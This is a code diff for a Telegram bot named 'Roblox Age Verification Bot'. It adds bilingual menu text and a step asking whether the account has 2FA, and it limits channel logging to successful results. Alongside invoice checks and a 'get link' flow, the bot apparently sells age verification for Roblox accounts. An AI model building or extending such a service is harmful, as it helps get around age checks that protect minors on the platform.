@@ -275,6 +275,10 @@ TEXTS = {
         "lang_choose": "🌐 Выберите язык / Choose language:",
         "lang_set": "✅ Язык установлен: Русский",
         "cancelled": "Отменено. /start",
+        "ask_2fa": "На каком аккаунте получить ссылку?",
+        "btn_no_2fa": "🔓 Без 2FA",
+        "btn_with_2fa": "🔐 С 2FA",
+        "2fa_wip": "⚙️ Функция в доработке!\n\nПоддержка аккаунтов с 2FA скоро появится.",
     },
     "en": {
         "main_menu_title": "*Roblox Age Verification Bot*",
@@ -351,6 +355,10 @@ TEXTS = {
         "lang_choose": "🌐 Выберите язык / Choose language:",
         "lang_set": "✅ Language set: English",
         "cancelled": "Cancelled. /start",
+        "ask_2fa": "Which account type do you want to verify?",
+        "btn_no_2fa": "🔓 Without 2FA",
+        "btn_with_2fa": "🔐 With 2FA",
+        "2fa_wip": "⚙️ Feature in development!\n\nSupport for 2FA accounts is coming soon.",
     }
 }
 
@@ -824,8 +832,10 @@ def check_invoice(invoice_id):
 import time as _time
 
 async def send_log(bot, user_id, username, method, result, elapsed_sec, success):
-    """Отправляем лог в канал"""
+    """Отправляем лог в канал — только успехи"""
     if not LOG_CHANNEL_ID:
+        return
+    if not success:
         return
     try:
         if success:
@@ -1037,13 +1047,35 @@ async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 ])
             )
             return WAITING_MENU
+        # Шаг 1 — спрашиваем про 2FA
+        await query.edit_message_text(
+            t(user_id, "ask_2fa"),
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton(t(user_id, "btn_no_2fa"), callback_data="2fa_no"),
+                 InlineKeyboardButton(t(user_id, "btn_with_2fa"), callback_data="2fa_yes")],
+                [InlineKeyboardButton(t(user_id, "btn_back"), callback_data="main_menu")],
+            ])
+        )
+        return WAITING_MENU
+
+    if data == "2fa_yes":
+        await query.edit_message_text(
+            t(user_id, "2fa_wip"),
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton(t(user_id, "btn_back"), callback_data="get_link")],
+            ])
+        )
+        return WAITING_MENU
+
+    if data == "2fa_no":
+        # Шаг 2 — выбор метода (Camera / ID)
         await query.edit_message_text(
             t(user_id, "choose_method"),
             parse_mode="Markdown",
             reply_markup=InlineKeyboardMarkup([
                 [InlineKeyboardButton(t(user_id, "btn_camera"), callback_data="choose_camera")],
                 [InlineKeyboardButton(t(user_id, "btn_id"), callback_data="choose_id")],
-                [InlineKeyboardButton(t(user_id, "btn_back"), callback_data="main_menu")],
+                [InlineKeyboardButton(t(user_id, "btn_back"), callback_data="get_link")],
             ])
         )
         return WAITING_MENU
